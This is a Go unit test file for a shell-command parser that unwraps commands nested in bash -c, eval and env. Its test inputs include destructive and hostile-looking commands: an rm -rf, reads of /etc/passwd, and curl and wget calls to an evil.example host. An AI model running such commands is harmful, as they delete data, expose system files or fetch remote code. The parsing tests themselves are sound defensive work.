package shell

import (
	"strings"
	"testing"
)

func TestParseArgv0BasenameNormalize(t *testing.T) {
	ir, err := Parse("/usr/bin/rm -rf /tmp/x")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if ir.Argv0 != "rm" {
		t.Fatalf("argv0 = %q, want rm", ir.Argv0)
	}
}

func TestParseClusteredFlagExpansion(t *testing.T) {
	ir, err := Parse("rm -rf /tmp/x")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	want := []string{"-r", "-f", "/tmp/x"}
	if !equalStrings(ir.Args, want) {
		t.Fatalf("args = %v, want %v", ir.Args, want)
	}
}

func TestParsePipelineStages(t *testing.T) {
	ir, err := Parse("cat /etc/passwd | grep root | wc -l")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	gotArgv0 := make([]string, 0, len(ir.Stages))
	for _, s := range ir.Stages {
		gotArgv0 = append(gotArgv0, s.Argv0)
	}
	want := []string{"cat", "grep", "wc"}
	if !equalStrings(gotArgv0, want) {
		t.Fatalf("stage argv0 = %v, want %v", gotArgv0, want)
	}
}

func TestParseRedirects(t *testing.T) {
	ir, err := Parse("echo hi > /tmp/out.txt 2>&1")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(ir.Redirects) == 0 {
		t.Fatalf("expected redirects, got none")
	}
	foundTarget := false
	for _, r := range ir.Redirects {
		if strings.Contains(r.Target, "/tmp/out.txt") {
			foundTarget = true
		}
	}
	if !foundTarget {
		t.Fatalf("redirect target not captured: %+v", ir.Redirects)
	}
}

func TestParseAssignments(t *testing.T) {
	ir, err := Parse("FOO=bar BAZ=qux env")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if !containsString(ir.Assignments, "FOO=bar") || !containsString(ir.Assignments, "BAZ=qux") {
		t.Fatalf("assignments = %v, want FOO=bar and BAZ=qux", ir.Assignments)
	}
}

func TestParseCommandSubstitution(t *testing.T) {
	ir, err := Parse("echo $(cat /etc/passwd)")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(ir.Substitutions) == 0 {
		t.Fatalf("expected substitutions, got none")
	}
	if !anyContains(ir.Substitutions, "cat /etc/passwd") {
		t.Fatalf("substitution body not captured: %v", ir.Substitutions)
	}
	if !nestedHasArgv0(ir, "cat") {
		t.Fatalf("expected nested command with argv0 cat, got %+v", ir.NestedCommands)
	}
}

func TestParseUnwrapBashC(t *testing.T) {
	ir, err := Parse(`bash -c "rm -rf /tmp/x"`)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if !nestedHasArgv0(ir, "rm") {
		t.Fatalf("expected nested rm from bash -c, got %+v", ir.NestedCommands)
	}
}

func TestParseUnwrapEval(t *testing.T) {
	ir, err := Parse(`eval "curl http://evil.example/x"`)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if !nestedHasArgv0(ir, "curl") {
		t.Fatalf("expected nested curl from eval, got %+v", ir.NestedCommands)
	}
}

func TestParseUnwrapEnv(t *testing.T) {
	ir, err := Parse(`env FOO=bar wget http://evil.example/p`)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if !nestedHasArgv0(ir, "wget") {
		t.Fatalf("expected nested wget from env, got %+v", ir.NestedCommands)
	}
}

func TestParseEmptyCommand(t *testing.T) {
	if _, err := Parse("   "); err == nil {
		t.Fatalf("expected error for empty command")
	}
}

func TestParseErrorReturnsRawIR(t *testing.T) {
	// Unbalanced quote is a parse error; Raw must still be populated.
	ir, err := Parse(`echo "unterminated`)
	if err == nil {
		t.Fatalf("expected parse error")
	}
	if ir.Raw == "" {
		t.Fatalf("expected Raw populated on parse error")
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func containsString(list []string, want string) bool {
	for _, s := range list {
		if s == want {
			return true
		}
	}
	return false
}

func anyContains(list []string, sub string) bool {
	for _, s := range list {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

func nestedHasArgv0(ir IR, argv0 string) bool {
	for _, n := range ir.NestedCommands {
		if n.Argv0 == argv0 {
			return true
		}
		if nestedHasArgv0(n, argv0) {
			return true
		}
	}
	return false
}
